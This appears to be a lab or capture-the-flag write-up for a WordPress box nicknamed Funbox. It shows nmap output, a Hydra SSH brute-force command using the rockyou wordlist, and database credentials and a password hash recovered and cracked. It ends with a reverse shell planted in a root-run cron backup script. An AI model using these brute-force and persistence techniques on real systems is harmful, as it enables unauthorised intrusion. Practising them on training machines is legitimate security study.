nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d2:f6:53:1b:5a:49:7d:74:8d:44:f5:46:e3:93:29:d3 (RSA)
|   256 a6:83:6f:1b:9c:da:b4:41:8c:29:f4:ef:33:4b:20:e0 (ECDSA)
|_  256 a6:5b:80:03:50:19:91:66:b6:c3:98:b8:c4:4f:5c:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/secret/
|_http-title: Did not follow redirect to http://funbox.fritz.box/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

| http-wordpress-users: 
| Username found: admin
| Username found: joe
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|_  /secret/: Potentially interesting folder

when accessing the ip in firefox it redirects to funbox.fritz.box
so i added it into the /etc/hosts file
<img width="575" height="158" alt="image" src="https://github.com/user-attachments/assets/76d18c79-174f-417d-991e-822481f545c2" />

web discovery
/wp-content
/wp-admin
/secret
/wp-includes

─$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip ssh -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).


used username joe and admin to bruteforce ssh
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-06 13:42:41
[DATA] max 4 tasks per 1 server, overall 4 tasks, 28688798 login tries (l:2/p:14344399), ~7172200 tries per task
[DATA] attacking ssh://192.168.237.77:22/
[22][ssh] host: 192.168.237.77   login: joe   password: 12345

in /var/www/html find wpconfig
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'wordpress');

retrieve from wp_users
admin      | $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1

hashcrack the hash. password for admin is  iubire  
<img width="1229" height="618" alt="image" src="https://github.com/user-attachments/assets/f7511c11-76fa-4339-9887-8906f7f7a73c" />


reminder talks about the .backup.sh files, so likely cronjob. added reverse shell into the backup.sh from revshells
<img width="1320" height="155" alt="image" src="https://github.com/user-attachments/assets/ba3d4c6d-c57c-4efe-b45e-21bf5d3cfff4" />
<img width="1089" height="212" alt="image" src="https://github.com/user-attachments/assets/235f4c8c-ffed-439a-8f20-ec1c85fce87f" />


it catches on to funny account at first, keep repeating until root catches
<img width="983" height="383" alt="image" src="https://github.com/user-attachments/assets/50371a07-80a4-4b49-89bb-3826aa550d76" />


doing a crontab later on, we can see that root has its own cron. runs backup.sh every 5 mins
<img width="767" height="434" alt="image" src="https://github.com/user-attachments/assets/bb2e3c1b-381f-45a2-8e75-2ea4550ddb7a" />


